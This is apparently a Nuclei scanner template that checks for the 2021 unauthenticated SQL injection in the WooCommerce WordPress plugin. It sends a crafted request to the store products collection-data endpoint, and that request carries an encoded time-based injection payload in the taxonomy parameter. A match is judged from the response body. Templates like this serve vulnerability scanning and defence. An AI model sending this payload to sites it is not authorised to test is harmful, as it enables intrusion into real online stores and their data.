id: WP-Woocommerce-SQLi
info:
  name: Unauthen SQL injection Woocommerce
  author: Udyz,lotusdll
  severity: critical
  description: The WP Woocommerce WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.
  reference: |
    - https://woocommerce.com/posts/critical-vulnerability-detected-july-2021/
  tags: unauth,sqli,wordpress

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=and&calculate_attribute_counts[1][taxonomy]=xxx%252522%252529%252520or%252520sleep%2525280%25252e1%252529%252523'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '"price_range": null,'
          - '"attribute_counts":[],'
          - '"rating_counts":null,'
        part: body
